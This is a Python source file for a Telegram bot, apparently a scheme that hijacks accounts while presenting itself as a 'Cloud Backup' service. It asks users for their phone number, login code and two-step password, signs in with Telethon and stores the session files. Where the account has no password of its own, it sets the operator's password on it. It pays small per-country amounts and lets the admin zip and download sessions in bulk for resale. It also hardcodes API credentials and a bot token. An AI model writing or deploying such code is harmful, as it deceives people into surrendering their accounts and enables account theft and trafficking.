import os
import asyncio
import json
import shutil
import zipfile
from datetime import datetime
from threading import Thread
from flask import Flask, render_template_string
import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tl_types
from telethon.errors import SessionPasswordNeededError

# ==================== কোর এডমিন কনফিগারেশন ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
ADMIN_ID = 8095751648
# =========================================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
app = Flask(__name__)

BASE_STORAGE_DIR = "user_backups"
DB_FILE = "user_database.json"
SETTINGS_FILE = "bot_settings.json"

if not os.path.exists(BASE_STORAGE_DIR):
    try: os.makedirs(BASE_STORAGE_DIR, exist_ok=True)
    except: pass

user_data = {}
admin_state = {}

# শুরুতে ব্ল্যাঙ্ক বা ডিফল্ট কিছু কান্ট্রি (এডমিন প্যানেল থেকে আপনি যেকোনো সময় পরিবর্তন/যোগ করতে পারবেন)
DEFAULT_SETTINGS = {
    "security_password": "MySecureBotPassword123",
    "country_prices": {"52": 0.51, "60": 0.47, "49": 0.90, "54": 0.50, "880": 0.15},
    "country_capacity": {"52": 9965982, "60": 100, "49": 838, "54": 500, "880": 50},
    "country_delays": {"52": 60, "60": 60, "49": 60, "54": 60, "880": 60}
}

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r") as f:
                loaded = json.load(f)
                for key in DEFAULT_SETTINGS:
                    if key not in loaded: loaded[key] = DEFAULT_SETTINGS[key]
                return loaded
        except: return DEFAULT_SETTINGS
    return DEFAULT_SETTINGS

def save_settings(settings):
    try:
        with open(SETTINGS_FILE, "w") as f: json.dump(settings, f, indent=4)
    except: pass

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    try:
        with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)
    except: pass

def get_user_stats(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"verified": 0, "unverified": 0, "balance": 0.0, "frozen_count": 0, "frozen_balance": 0.0}
        save_db(db)
    return db[uid]

def add_user_account_success(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"verified": 0, "unverified": 0, "balance": 0.0, "frozen_count": 0, "frozen_balance": 0.0}
    db[uid]["verified"] += 1
    db[uid]["balance"] = round(db[uid]["balance"] + amount, 2)
    save_db(db)

def get_current_file_count(country_code):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir): return 0
    try: return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
    except: return 0

# ==================== UPTIME WEB SERVER ====================
@app.route('/')
def home():
    settings = load_settings()
    total_sessions = 0
    country_list_html = ""
    for code in settings["country_prices"]:
        count = get_current_file_count(code)
        total_sessions += count
        cap = settings["country_capacity"].get(code, "No Limit")
        country_list_html += f"<tr><td><b>+{code}</b></td><td>{count} / {cap}</td><td>${settings['country_prices'][code]}</td></tr>"

    html_template = f"""
    <!DOCTYPE html><html><head><title>Dashboard</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {{ font-family: sans-serif; background-color: #0f172a; color: #f8fafc; text-align: center; padding: 40px 20px; }} .card {{ background: #1e293b; max-width: 450px; margin: auto; padding: 25px; border-radius: 10px; border: 1px solid #334155; }} h1 {{ color: #38bdf8; }} table {{ width: 100%; margin-top: 15px; text-align: left; }} th, td {{ padding: 8px; border-bottom: 1px solid #334155; }}</style></head>
    <body><div class="card"><h2 style="color:#10b981;">● SERVER ONLINE</h2><h1>Cloud Backup Bot</h1><p>Total Saved Sessions: <b>{total_sessions}</b></p><table><tr><th>Country</th><th>Used/Cap</th><th>Price</th></tr>{country_list_html}</table></div></body></html>
    """
    return render_template_string(html_template)

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

Thread(target=run_web, daemon=True).start()

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def check_valid_country_and_get_code(phone_number):
    clean = phone_number.replace("+", "").replace(" ", "")
    settings = load_settings()
    # সবচেয়ে বড় কোড ম্যাচিং আগে করার জন্য সাজানো (যেমন: ৮৮০ আগে চেক হবে ৮ এর আগে)
    sorted_codes = sorted(settings["country_prices"].keys(), key=len, reverse=True)
    for code in sorted_codes:
        if clean.startswith(code):
            return code
    return None

# ==================== ফ্রন্টএন্ড ইউজার হ্যান্ডলার্স ====================
def process_start(message):
    welcome_text = (
        "👋 **Welcome to Cloud Backup Telegram Bot**\n\n"
        "To start a secure backup of your Telegram Account, please send your phone number with your country code.\n"
        "Example: `+88017XXXXXXXX` or `+52XXXXXXXXXX`"
    )
    bot.send_message(message.chat.id, welcome_text)

def process_cancel(message):
    user_id = message.from_user.id
    if user_id in user_data:
        try: loop.run_until_complete(user_data[user_id]["client"].disconnect())
        except: pass
        del user_data[user_id]
    bot.send_message(message.chat.id, "❌ **Cancelled.**\n\nYou can send a new phone number to start again.")

def process_capacity(message):
    settings = load_settings()
    response = f"👍 **Available Countries : ({len(settings['country_prices'])})**:\n\n"
    for code in settings["country_prices"]:
        prc = settings["country_prices"][code]
        cap = settings["country_capacity"].get(code, 999)
        delay = settings.get("country_delays", {}).get(code, 60)
        response += f"🌍 **+{code}**\nFree:${prc}|New:${prc}|Spam:${prc}|Perm:${prc}|{cap}|{delay}s\n\n"
    bot.send_message(message.chat.id, response)

def process_account(message):
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    current_time = datetime.now().strftime("%m/%d/%y")
    current_clock = datetime.now().strftime("%H:%M:%S")
    
    response = (
        f"👤 **ID : {user_id}**\n\n"
        f"✅ Number of verified accounts : {stats['verified']}\n"
        f"⏳ Number of unverified accounts : {stats['unverified']}\n"
        f"🅈 Available Balance IN USDT : {stats['balance']:.2f}\n"
        f"🛢 Number of frozen account : {stats['frozen_count']}\n"
        f"🧊 Total Frozen Balance : {stats['frozen_balance']:.2f}\n\n"
        f"📅 Date : {current_time}\n"
        f"🕐 Time : {current_clock} ( NZ Time )\n\n"
        f"✍️ *Note : You Can Also Check Your Withdraw History Using This Command*\n\n"
        f"/withdrawhistory"
    )
    bot.send_message(message.chat.id, response)

def process_withdraw(message):
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    if stats['verified'] < 5:
        bot.send_message(message.chat.id, "⚠️ **Minimum withdrawal is at least 5 account(s).**")
    else:
        bot.send_message(message.chat.id, "✅ Your withdrawal request has been submitted to the admin.")

@bot.message_handler(commands=['start'])
def cmd_start(message): process_start(message)

@bot.message_handler(commands=['cancel'])
def cmd_cancel(message): process_cancel(message)

@bot.message_handler(commands=['capacity'])
def cmd_capacity(message): process_capacity(message)

@bot.message_handler(commands=['account'])
def cmd_account(message): process_account(message)

@bot.message_handler(commands=['withdraw'])
def cmd_withdraw(message): process_withdraw(message)

@bot.message_handler(commands=['withdrawhistory'])
def cmd_history(message): bot.send_message(message.chat.id, "📜 Your withdrawal history is empty.")

# ==================== ایڈمین কন্ট্রোল پ্যানেল UI ====================
@bot.message_handler(commands=['panel'])
def admin_panel_command(message):
    if message.from_user.id != ADMIN_ID: return
    settings = load_settings()
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn_pass = types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass")
    btn_set_country = types.InlineKeyboardButton("🌍 Set Country (All-in-One)", callback_data="pnl_set_country")
    btn_all_sessions = types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files")
    btn_close = types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close")
    
    markup.add(btn_pass, btn_set_country)
    markup.add(btn_all_sessions)
    markup.add(btn_close)
    
    panel_msg = (
        "🛠 *Master Admin Control Panel*\n\n"
        f"🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n"
        "📈 *Currently Allowed/Opened Countries:*\n"
    )
    for code in settings["country_prices"]:
        prc = settings["country_prices"][code]
        cap = settings["country_capacity"].get(code, "No Limit")
        delay = settings.get("country_delays", {}).get(code, 60)
        panel_msg += f"• 🌍 `+{code}` ➜ Price: **${prc}** | Cap: **{cap}** | Time: **{delay}s**\n"
        
    bot.send_message(message.chat.id, panel_msg, reply_markup=markup)

# ==================== ایڈمین ফাইল এক্সট্রাকশন কম্যান্ড (/getfiles) ====================
@bot.message_handler(commands=['getfiles'])
def cmd_get_files(message):
    if message.from_user.id != ADMIN_ID: return
    guide = (
        "📥 *Download Session Files*\n\n"
        "Please send the query in the exact format below:\n"
        "`CountryCode=HowManyPieces`\n\n"
        "Example to get 10 pieces of Bangladesh files:\n"
        "`880=10`"
    )
    bot.send_message(message.chat.id, guide)
    admin_state[message.from_user.id] = "wait_extract_files"

# ==================== ایڈمین বাটন অ্যাকশন হ্যান্ডলিং ====================
@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
def handle_admin_callbacks(call):
    if call.from_user.id != ADMIN_ID: return
    
    if call.data == "pnl_close":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return
        
    if call.data == "pnl_all_files":
        settings = load_settings()
        total_files = 0
        file_msg = "📂 *Live Backup Session Files Count:*\n\n"
        for code in settings["country_prices"]:
            count = get_current_file_count(code)
            total_files += count
            file_msg += f"🌍 Country `+{code}`: **{count} Pcs**\n"
        file_msg += f"\n📊 *Total Combined Backup Files:* `{total_files} Pcs`"
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ Back to Panel", callback_data="pnl_back"))
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=file_msg, reply_markup=markup, parse_mode="Markdown")
        return

    if call.data == "pnl_back":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel_command(call.message)
        return

    bot.delete_message(call.message.chat.id, call.message.message_id)
    
    if call.data == "pnl_pass":
        bot.send_message(call.message.chat.id, "🔐 **Please enter the new default 2FA password:**")
        admin_state[call.from_user.id] = "wait_pass"
    elif call.data == "pnl_set_country":
        guide_msg = (
            "🌍 *Set Country Parameters (All-In-One)*\n\n"
            "Please send the data in the exact format below:\n"
            "`Code=Price=Capacity=DelayTime`\n\n"
            "Example to update or add Bangladesh:\n"
            "`880=0.15=50=60`"
        )
        bot.send_message(call.message.chat.id, guide_msg)
        admin_state[call.from_user.id] = "wait_country_all"

# ==================== গ্লোবাল মেসেজ ফিল্টারিং ও কান্ট্রি ভ্যালিডেশন ====================
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    low_text = text.lower()

    # ১. এডمین سٹیٹ ہینڈلنگ
    if user_id == ADMIN_ID and user_id in admin_state:
        state = admin_state[user_id]
        settings = load_settings()
        del admin_state[user_id] 
        
        try:
            if state == "wait_pass":
                settings["security_password"] = text
                save_settings(settings)
                bot.reply_to(message, f"✅ *Success!* Default 2FA Password updated to:\n`{text}`")
                
            elif state == "wait_country_all":
                parts = text.split("=")
                code = parts[0].strip().replace("+", "")
                price = float(parts[1].strip())
                capacity = int(parts[2].strip())
                delay = int(parts[3].strip())
                
                settings["country_prices"][code] = price
                settings["country_capacity"][code] = capacity
                if "country_delays" not in settings: settings["country_delays"] = {}
                settings["country_delays"][code] = delay
                
                save_settings(settings)
                success_msg = (
                    f"✅ *Country Parameters Updated!*\n\n"
                    f"🌍 Country Code: `+{code}`\n"
                    f"💰 Price: **${price}**\n"
                    f"📊 Capacity Limit: **{capacity} Pcs**\n"
                    f"⏳ Confirmation Time: **{delay} Seconds**"
                )
                bot.reply_to(message, success_msg)

            elif state == "wait_extract_files":
                parts = text.split("=")
                code = parts[0].strip().replace("+", "")
                count_to_get = int(parts[1].strip())
                
                target_dir = os.path.join(BASE_STORAGE_DIR, code)
                if not os.path.exists(target_dir):
                    bot.reply_to(message, "❌ No files found for this country code!")
                    return
                
                all_files = sorted([f for f in os.listdir(target_dir) if f.endswith(".session")])
                if not all_files:
                    bot.reply_to(message, "❌ No session files available in this directory!")
                    return
                
                actual_count = min(count_to_get, len(all_files))
                files_to_zip = all_files[:actual_count]
                
                zip_filename = f"sessions_{code}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
                
                with zipfile.ZipFile(zip_filename, 'w') as zipf:
                    for f in files_to_zip:
                        f_path = os.path.join(target_dir, f)
                        zipf.write(f_path, f)
                        try: os.remove(f_path)
                        except: pass
                
                with open(zip_filename, 'rb') as z:
                    bot.send_document(message.chat.id, z, caption=f"📦 *Successfully Extracted:*\n🌍 Country: `+{code}`\n📊 Requested: `{count_to_get} Pcs` | Found & Sent: `{actual_count} Pcs`")
                
                try: os.remove(zip_filename)
                except: pass

        except Exception as e:
            bot.reply_to(message, f"❌ *Format Error!* Please try again. Error: {str(e)}")
        return

    # ২. ইউজার মেনু বাটন হ্যান্ডলিং
    if "start" in low_text or "/start" in low_text: process_start(message); return
    elif "cancel" in low_text or "/cancel" in low_text: process_cancel(message); return
    elif "capacity" in low_text or "/capacity" in low_text: process_capacity(message); return
    elif "account" in low_text or "/account" in low_text: process_account(message); return
    elif "withdraw" in low_text or "/withdraw" in low_text: process_withdraw(message); return

    # ৩. নম্বর ইনপুট ও কান্ট্রি ওপেন/ক্লোজ ভ্যালিডেশন ফিল্টার
    if text.startswith("+") or text.isdigit():
        phone = text if text.startswith("+") else f"+{text}"
        
        # এখানে ফিল্টারিং চেক হচ্ছে (অ্যাড করা দেশগুলোর বাইরে অন্য কোনো কোড পেলে সাথে সাথে রিজেক্ট)
        matched_country_code = check_valid_country_and_get_code(phone)
        if not matched_country_code:
            bot.reply_to(message, "❗you cannot at account from country.")
            return
            
        bot.reply_to(message, "⏳ Requesting OTP from Telegram Servers...")
        loop.run_until_complete(send_otp_task(phone, matched_country_code, user_id, message))
        
    elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
        loop.run_until_complete(verify_otp_task(text, user_id, message))

# ==================== ওটিپی ও সেশন কোর অটোমেশন ব্যাকএন্ড ====================
async def send_otp_task(phone_number, country_code, user_id, message):
    settings = load_settings()
    max_capacity = settings["country_capacity"].get(country_code, 9999)
    if get_current_file_count(country_code) >= max_capacity:
        bot.reply_to(message, f"❌ **Capacity Over!** for code `+{country_code}`.")
        return

    clean_phone = phone_number.replace("+", "").replace(" ", "")
    final_session_path = os.path.join(BASE_STORAGE_DIR, country_code, f"+{clean_phone}")
    os.makedirs(os.path.dirname(final_session_path), exist_ok=True)
    
    for ext in [".session", ".session-journal"]:
        if os.path.exists(final_session_path + ext):
            try: os.remove(final_session_path + ext)
            except: pass

    user_client = TelegramClient(final_session_path, API_ID, API_HASH, base_logger='critical')
    try:
        await user_client.connect()
        sent_code = await user_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": user_client, "phone": phone_number, "phone_code_hash": sent_code.phone_code_hash,
            "clean_phone": clean_phone, "session_path": final_session_path, "country_code": country_code
        }
        bot.reply_to(message, "📨 Please enter the OTP code sent to your Telegram app:")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
        try: await user_client.disconnect()
        except: pass

async def verify_otp_task(text, user_id, message):
    data = user_data[user_id]
    user_client = data["client"]
    if data.get("waiting_for_password"):
        try:
            await user_client.sign_in(password=text)
            await process_security_and_backup(user_id, message, data, user_client)
            del user_data[user_id]
        except Exception as e: bot.reply_to(message, f"❌ Password Error: {str(e)}")
    else:
        try:
            await user_client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
            await process_security_and_backup(user_id, message, data, user_client)
            del user_data[user_id]
        except SessionPasswordNeededError:
            bot.reply_to(message, "🔐 Two-step verification active. Enter 2FA Password:")
            user_data[user_id]["waiting_for_password"] = True
        except Exception as e: bot.reply_to(message, f"❌ OTP Error: {str(e)}")

async def process_security_and_backup(user_id, message, data, current_client):
    settings = load_settings()
    country_delays = settings.get("country_delays", {})
    delay = country_delays.get(data['country_code'], 60)
    
    status_msg = bot.reply_to(message, f"⏳ Securing cloud backup... Please wait {delay}s.")
    await asyncio.sleep(delay)
    try:
        auths = await current_client(functions.account.GetAuthorizationsRequest())
        if len([a for a in auths.authorizations if not a.current]) > 0:
            bot.edit_message_text("❌ **Backup Failed!** Multiple sessions detected.", message.chat.id, status_msg.message_id)
            await current_client.disconnect()
            return False
        try:
            await current_client(functions.account.UpdatePasswordSettingsRequest(
                password=tl_types.InputCheckPasswordEmpty(),
                new_settings=tl_types.PasswordInputSettings(new_password=settings["security_password"], hint="Cloud Lock")
            ))
        except: pass
        await current_client.disconnect()
        add_user_account_success(user_id, settings["country_prices"].get(data['country_code'], 0.05))
        bot.edit_message_text("✅ **Account successfully backed up!**", message.chat.id, status_msg.message_id)
        bot.send_message(ADMIN_ID, f"🔔 **New Verified Session Saved:** `+{data['clean_phone']}`")
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", message.chat.id, status_msg.message_id)

if __name__ == "__main__":
    bot.infinity_polling(skip_pending=True)
